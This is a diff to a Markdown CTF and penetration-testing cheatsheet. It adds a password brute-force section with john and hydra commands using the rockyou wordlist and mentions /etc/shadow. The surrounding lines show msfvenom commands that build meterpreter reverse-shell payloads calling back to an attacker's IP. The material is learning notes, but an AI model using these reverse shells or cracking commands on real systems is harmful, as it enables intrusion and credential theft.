@@ -7,6 +7,7 @@
 	* [Dirsearch](#Dirsearch)
 	* [Exploitdb](#Exploitdb)	
 	* [Metasploit](#Metasploit)
+	* [Brute force password tools](#Brute force password)
 * CTF Pwn Cheatsheet
 * Privilege Escalation
 * Reverse Shell
@@ -217,5 +218,15 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost="Your IP" lport="Your Port" -f
 msfvenom -p python/meterpreter/reverse_tcp LHOST="Your IP" LPORT="Your Port" -f pyterpreter.py
 (Create a pyhton reverse shell script)
 ```
-
+### Brute force password
+/etc/shadow and /etc/passwd are the sensitive file in linux.
+* john
+```
+john encrypted.txt --wordlist=rockyou.txt (this is a password dictionary file)
+```
+* hydra
+It is a tool that could crack online password.
+```
+hydra -l "Target User Name" -P rockyou.txt "IP"
+```
 
